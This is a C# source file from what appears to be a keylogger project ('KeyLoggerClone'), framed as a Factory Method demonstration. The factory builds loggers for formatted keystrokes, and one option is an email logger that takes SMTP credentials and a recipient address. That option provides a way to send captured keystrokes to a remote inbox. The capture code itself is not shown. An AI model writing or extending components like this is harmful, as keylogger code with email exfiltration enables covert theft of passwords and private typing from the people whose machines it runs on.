using System;
using KeyLoggerClone.Formatters;

namespace KeyLoggerClone.Loggers
{
    /// <summary>
    /// Factory for creating concrete implementations of ILogger.
    /// Demonstrates the Factory Method Design Pattern.
    /// </summary>
    public static class LoggerFactory
    {
        /// <summary>
        /// Creates an ILogger instance.
        /// </summary>
        public static ILogger CreateLogger(
            string loggerType,
            IKeyFormatter formatter,
            string filePath = null,
            string smtpHost = null,
            int smtpPort = 587,
            string senderEmail = null,
            string senderPassword = null,
            string recipientEmail = null,
            bool enableSsl = true)
        {
            switch (loggerType.ToLowerInvariant())
            {
                case "file":
                    if (string.IsNullOrEmpty(filePath))
                    {
                        throw new ArgumentException("File path must be provided for FileLogger.", nameof(filePath));
                    }
                    return new FileLogger(filePath, formatter);

                case "event":
                    return new EventLogger(formatter);

                case "email":
                    if (string.IsNullOrEmpty(smtpHost) || string.IsNullOrEmpty(senderEmail) || 
                        string.IsNullOrEmpty(senderPassword) || string.IsNullOrEmpty(recipientEmail))
                    {
                        throw new ArgumentException("SMTP details (Host, Sender, Password, Recipient) must be specified for EmailLogger.");
                    }
                    return new EmailLogger(smtpHost, smtpPort, senderEmail, senderPassword, recipientEmail, enableSsl, formatter);

                default:
                    throw new NotSupportedException($"Logger type '{loggerType}' is not supported.");
            }
        }
    }
}
